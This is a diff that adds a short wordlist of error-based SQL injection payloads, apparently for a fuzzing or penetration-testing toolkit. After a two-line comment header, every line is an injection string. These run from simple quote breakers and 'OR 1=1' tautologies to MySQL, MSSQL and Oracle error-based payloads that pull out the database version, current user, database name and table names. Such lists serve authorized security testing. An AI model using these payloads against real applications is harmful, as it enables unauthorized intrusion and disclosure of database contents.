@@ -1,0 +1,29 @@
+# Error-Based SQL Injection Payloads
+# Forces database errors that reveal version/schema info
+'
+''
+'''
+'--
+' --
+"
+""
+`
+')
+'))
+';
+' OR ''='
+' OR 1=1--
+AND 1=2
+AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),0)--
+1 AND EXP(~(SELECT * FROM(SELECT user())a))--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
+' UNION SELECT 1,2,3 FROM not_a_table--
+' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))--
+' OR 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+'; EXEC('SELECT 1/0')--
+' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--
